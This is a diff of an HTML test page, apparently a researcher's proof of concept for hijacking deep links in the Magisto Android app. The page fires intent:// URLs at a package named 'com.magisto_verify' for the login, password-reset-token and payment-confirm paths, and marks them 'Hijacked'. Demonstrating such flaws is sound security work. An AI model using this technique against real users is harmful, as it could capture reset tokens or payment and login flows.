@@ -1,74 +1,85 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Magisto Security Test</title>
+    <title>Magisto Deep Link Security Test</title>
     <style>
-        body { font-family: Arial, sans-serif; max-width: 500px; margin: 40px auto; padding: 20px; }
-        .test-case { margin: 25px 0; padding: 0; }
-        .btn { 
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; }
+        .button { 
             background: #080844; 
             color: white; 
-            padding: 12px 20px; 
+            padding: 15px 25px; 
             border: none; 
-            border-radius: 4px; 
+            border-radius: 5px; 
             cursor: pointer; 
-            width: 100%;
+            margin: 10px;
+            width: 90%;
             text-align: left;
-            margin: 5px 0;
         }
-        .btn:hover { background: #0d0d5e; }
-        .status { 
-            font-size: 12px; 
-            color: #666; 
-            margin: 5px 0 0 15px; 
-        }
-        .hijacked { border-left: 3px solid #d93025; }
-        .legitimate { border-left: 3px solid #34a853; }
-        h1 { color: #080844; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+        .button:hover { background: #0d0d5e; }
+        .section { border: 1px solid #ddd; padding: 20px; margin: 20px 0; border-radius: 5px; }
+        .status { margin-top: 10px; padding: 10px; background: #f0f0f0; border-radius: 5px; font-size: 14px; }
+        .icon { margin-right: 10px; }
     </style>
 </head>
 <body>
-    <h1>Magisto Deep Link Tests</h1>
-
-    <div class="test-case">
-        <button class="btn hijacked" onclick="openLink('magisto://www.magisto.com/account/login?email=test@example.com')">
-            🔓 Account Login
+    <h1>🔗 Magisto Deep Link Security Test</h1>
+    
+    <div class="section">
+        <h3>Test 1: Authentication Hijack</h3>
+        <button class="button" onclick="triggerLoginIntercept()">
+            <span class="icon">🔓</span>Trigger Login Deep Link
         </button>
-        <div class="status">Hijacked - Opens POC directly</div>
+        <div class="status" id="status1">Ready - /account/login (Hijacked)</div>
     </div>
 
-    <div class="test-case">
-        <button class="btn hijacked" onclick="openLink('magisto://www.magisto.com/reset/password?token=abc123xyz')">
-            🔑 Password Reset
+    <div class="section">
+        <h3>Test 2: Password Reset Hijack</h3>
+        <button class="button" onclick="triggerPasswordReset()">
+            <span class="icon">🔑</span>Trigger Password Reset
         </button>
-        <div class="status">Hijacked - Opens POC directly</div>
+        <div class="status" id="status2">Ready - /reset/password (Hijacked)</div>
     </div>
 
-    <div class="test-case">
-        <button class="btn hijacked" onclick="openLink('magisto://www.magisto.com/payment/confirm?amount=49.99')">
-            💳 Payment Confirm
+    <div class="section">
+        <h3>Test 3: Payment Flow Hijack</h3>
+        <button class="button" onclick="triggerPaymentIntercept()">
+            <span class="icon">💳</span>Trigger Payment Flow
         </button>
-        <div class="status">Hijacked - Opens POC directly</div>
+        <div class="status" id="status3">Ready - /payment/confirm (Hijacked)</div>
     </div>
 
-    <div class="test-case">
-        <button class="btn legitimate" onclick="openLink('magisto://www.magisto.com/account/premium?feature=4k')">
-            ⭐ Premium Upgrade
+    <div class="section">
+        <h3>Test 4: Legitimate Paths (Shows Chooser)</h3>
+        <button class="button" onclick="triggerPremiumUpgrade()">
+            <span class="icon">⭐</span>Premium Upgrade
         </button>
-        <div class="status">Legitimate - Shows app chooser</div>
-    </div>
-
-    <div class="test-case">
-        <button class="btn legitimate" onclick="openLink('magisto://www.magisto.com/account/settings?section=privacy')">
-            ⚙️ Account Settings
-        </button>
-        <div class="status">Legitimate - Shows app chooser</div>
+        <div class="status" id="status4">Ready - /account/premium (Legitimate)</div>
     </div>
 
     <script>
-        function openLink(url) {
-            console.log('Opening:', url);
-            window.location.href = url;
+        function updateStatus(testNum, message) {
+            document.getElementById('status' + testNum).innerHTML = message;
+        }
+
+        function triggerLoginIntercept() {
+            updateStatus(1, "Triggering login intercept...");
+            // Use Intent URL format
+            window.location.href = "intent://www.magisto.com/account/login?email=user@example.com#Intent;scheme=magisto;package=com.magisto_verify;end;";
+        }
+
+        function triggerPasswordReset() {
+            updateStatus(2, "Triggering password reset intercept...");
+            window.location.href = "intent://www.magisto.com/reset/password?token=abc123xyz#Intent;scheme=magisto;package=com.magisto_verify;end;";
+        }
+
+        function triggerPaymentIntercept() {
+            updateStatus(3, "Triggering payment intercept...");
+            window.location.href = "intent://www.magisto.com/payment/confirm?amount=49.99#Intent;scheme=magisto;package=com.magisto_verify;end;";
+        }
+
+        function triggerPremiumUpgrade() {
+            updateStatus(4, "Triggering premium upgrade...");
+            window.location.href = "intent://www.magisto.com/account/premium?feature=4k#Intent;scheme=magisto;package=com.magisto_verify;end;";
         }
     </script>
 </body>
